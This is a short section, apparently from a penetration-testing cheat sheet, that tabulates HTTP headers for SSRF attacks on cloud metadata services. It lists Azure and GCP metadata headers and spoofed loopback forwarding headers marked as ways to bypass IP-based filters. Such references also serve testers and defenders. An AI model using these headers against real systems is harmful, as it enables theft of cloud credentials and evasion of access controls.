## 6. Required Headers for Metadata SSRF
| Header | Cloud | Purpose |
|---|---|---|
| `Metadata: true` | Azure | Mandatory to access metadata service |
| `Metadata-Flavor: Google` | GCP | Mandatory to access metadata service |
| `X-Forwarded-For: 127.0.0.1` | Generic | Bypass IP-based restrictions |
| `X-Forwarded-Host: 127.0.0.1` | Generic | Host header override |
| `X-Originating-IP: 127.0.0.1` | Generic | Legacy filter bypass |
| `X-Remote-IP: 127.0.0.1` | Generic | Legacy filter bypass |
| `X-Client-IP: 127.0.0.1` | Generic | Legacy filter bypass |
| `X-Real-IP: 127.0.0.1` | Generic | Reverse proxy trust bypass |

